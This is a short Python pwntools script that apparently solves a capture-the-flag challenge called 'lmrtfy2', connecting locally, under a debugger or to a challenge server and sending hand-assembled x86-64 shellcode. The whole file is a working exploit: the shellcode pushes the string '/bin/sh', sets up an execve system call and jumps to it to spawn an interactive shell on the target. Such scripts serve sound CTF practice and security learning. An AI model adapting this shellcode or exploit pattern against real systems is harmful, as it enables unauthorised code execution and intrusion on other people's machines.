#!/usr/bin/env python3
from pwn import *

bin_name = "./lmrtfy2"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='start\nb *($rip+0x262)\nc')
    elif args.REMOTE:
        return remote("lmrty2.challs.cyberchallenge.it", 9405)
    else:
        return process(elf.path)

def main():
    r = conn()
    r.recv()
    shellcode = asm('''
                mov r8,[rip - 0x540]
                neg r8
                mov r9, 0x0068732f6e69622f
                push r9
                mov rdi, rsp
                mov rax, 0x3b
                mov rsi, 0
                mov rdx, 0
                jmp r8
                    ''')
    r.sendline(shellcode)

    r.interactive()

if __name__ == "__main__":
    main()
